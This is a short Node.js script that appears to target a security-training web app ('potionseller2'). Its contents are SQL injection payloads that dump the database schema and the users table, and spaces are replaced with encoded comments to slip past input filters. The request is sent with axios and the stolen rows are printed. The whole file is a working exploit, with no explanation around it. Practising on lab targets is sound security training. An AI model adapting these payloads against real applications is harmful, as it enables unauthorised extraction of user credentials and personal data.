#!/bin/env node

import axios from 'axios'

const url = 'https://potionseller2.secu-web.blackfoot.dev'

function makeUrl(cmd) {
	return `${url}/potions/${cmd.replaceAll(' ', '%2f**%2f')}`
}

const injTest = '7 or id > 4'
const getUserTable = `7 ) union SELECT *,null FROM sqlite_master where type is 'table' and tbl_name is not 'potions'-- -`
const getUsers = '7 ) union SELECT *,null,null,null FROM users-- -'

async function main() {
	const inj = makeUrl(getUsers)
	console.log(inj)

	const res = await axios({
		method: 'get',
		url: inj,
	})
	console.log(res.data)
}

main()
